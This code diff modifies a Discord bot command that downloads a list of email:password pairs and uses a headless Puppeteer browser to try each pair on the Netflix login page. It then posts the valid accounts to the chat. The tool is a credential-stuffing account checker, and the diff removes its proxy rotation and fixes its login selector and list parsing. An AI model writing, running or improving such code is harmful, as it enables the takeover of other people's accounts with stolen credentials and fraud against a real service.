@@ -2,32 +2,21 @@ const fs = require("fs");
 const { RichEmbed } = require("discord.js");
 const puppeteer = require("puppeteer");
 const fetch = require("node-fetch");
-const {
-  getUserAgent,
-  getRandomInt,
-  downloadAndGetRandomProxy
-} = require("../../utils");
+const { getUserAgent } = require("../../utils");
 const { prefix } = require("../../config");
-const { runner: proxyRunner } = require("./proxy");
 
 const document = {};
 const URL = "https://www.netflix.com/login";
 
-const getPuppeteerOptions = async url => {
-  const { ipAndPort } = await proxyRunner();
-  const proxy = `${ipAndPort[getRandomInt(0, ipAndPort.length)]}`;
-
-  return {
-    args: [
-      "--disable-gpu",
-      "--disable-dev-shm-usage",
-      "--disable-setuid-sandbox",
-      "--no-first-run",
-      "--no-sandbox",
-      "--no-zygote",
-      `--proxy-server=${proxy}`
-    ]
-  };
+const puppeteerOptions = {
+  args: [
+    "--disable-gpu",
+    "--disable-dev-shm-usage",
+    "--disable-setuid-sandbox",
+    "--no-first-run",
+    "--no-sandbox",
+    "--no-zygote"
+  ]
 };
 
 const getCredentials = url => fetch(url).then(res => res.text());
@@ -53,7 +42,7 @@ const checkCredentials = async (
       msg.edit(
         `Checking... (${index + 1}/${
           credentials.length
-        })\nError: ${error_count}\nMessage: ${error_message}`
+        })\n${email}:${password}\nError: ${error_count}\nMessage: \`${error_message}\``
       );
 
       const page = await browser.newPage();
@@ -66,7 +55,14 @@ const checkCredentials = async (
       await page.keyboard.type(email);
       await page.focus("input[id=id_password]");
       await page.keyboard.type(password);
-      await page.click(".login-button");
+
+      try {
+        await page.waitFor(100);
+        await page.click("button[data-uia=login-submit-button]");
+      } catch (err) {
+        // do nothing
+      }
+
       await page.waitFor(3000);
 
       const cred_status = await page.evaluate(() => {
@@ -87,7 +83,6 @@ const checkCredentials = async (
         message.channel.send(`${cred_status} -> ${email}:${password}`);
 
         await browser.close();
-        const puppeteerOptions = await getPuppeteerOptions(URL);
         const newBrowser = await puppeteer.launch(puppeteerOptions);
         checkCredentials(
           { browser: newBrowser, credentials, message, msg },
@@ -110,7 +105,6 @@ const checkCredentials = async (
     // eslint-disable-next-line require-atomic-updates
     error_message = err;
     await browser.close();
-    const puppeteerOptions = await getPuppeteerOptions(URL);
     const newBrowser = await puppeteer.launch(puppeteerOptions);
     checkCredentials(
       { browser: newBrowser, credentials, message, msg },
@@ -133,12 +127,14 @@ module.exports = {
     const textResult = await getCredentials(args[0]);
     const credentials = textResult
       .split("\n")
-      .map(
-        cred => cred.includes("@") && cred.substring(0, cred.lastIndexOf(":"))
-      )
+      .map(cred => {
+        const thereIsSpace = cred.indexOf(" ") === -1;
+        const lastIndex = thereIsSpace ? cred.length : cred.indexOf(" ");
+
+        return cred.includes("@") && cred.substring(0, lastIndex);
+      })
       .filter(val => !!val);
 
-    const puppeteerOptions = await getPuppeteerOptions(URL);
     const browser = await puppeteer.launch(puppeteerOptions);
 
     return message.channel.send("Please wait...").then(async msg => {
